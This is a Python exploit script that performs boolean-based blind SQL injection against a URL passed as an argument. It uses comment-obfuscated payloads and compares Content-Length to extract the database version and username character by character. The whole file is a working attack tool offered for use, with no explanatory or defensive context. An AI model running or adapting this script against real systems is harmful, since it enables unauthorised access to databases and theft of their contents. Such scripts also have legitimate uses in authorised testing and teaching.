import sys
import requests

def sqli(entry_point, inj_str, true_len):
    # search for characters in printable ASCII range
    for j in range(32, 126): 
        target = entry_point + inj_str.replace("[CHAR]", str(j)) 
        r = requests.get(target)
        # Checking response for boolean answer
        if int(r.headers['Content-Length']) >= true_len :
            return j 
    return None

def sqli_true_len(entry_point):
    target = entry_point + "test')/**/or/**/(select/**/1)=1%23"
    r = requests.get(target)
    return int(r.headers['Content-Length'])

def sqli_false_len(entry_point):
    target = entry_point + "test')/**/or/**/(select/**/0)=1%23"
    r = requests.get(target)
    return int(r.headers['Content-Length'])

def main():
    if len(sys.argv) != 2:
        print('(+) usage example: %s http://localhost?param= ' %sys.argv[0])
    entry_point = sys.argv[1]
    true_len=sqli_true_len(entry_point)
    false_len=sqli_false_len(entry_point)
    if (true_len==false_len):
        print('(-) Entry point is not vulnerable to injection')
        sys.exit()
    print("(+) Retrieving database version....")
    # 19 is length of the version() string
    for i in range(1, 20): 
        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i 
        extracted_char = chr(sqli(entry_point, injection_string, true_len)) 
        print(extracted_char, end='', flush=True)
    print("\n(+) Retrieving username....")
    #16 is the maximum length of username
    for i in range(1, 17):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/user()),%d,1)))=[CHAR]%%23" % i 
        try:
            extracted_char = chr(sqli(entry_point, injection_string, true_len)) 
            print(extracted_char, end='', flush=True)
        #if username is smaller than 16
        except TypeError:
            break
    print("\n(+) done!")

if __name__ == "__main__":
    main()
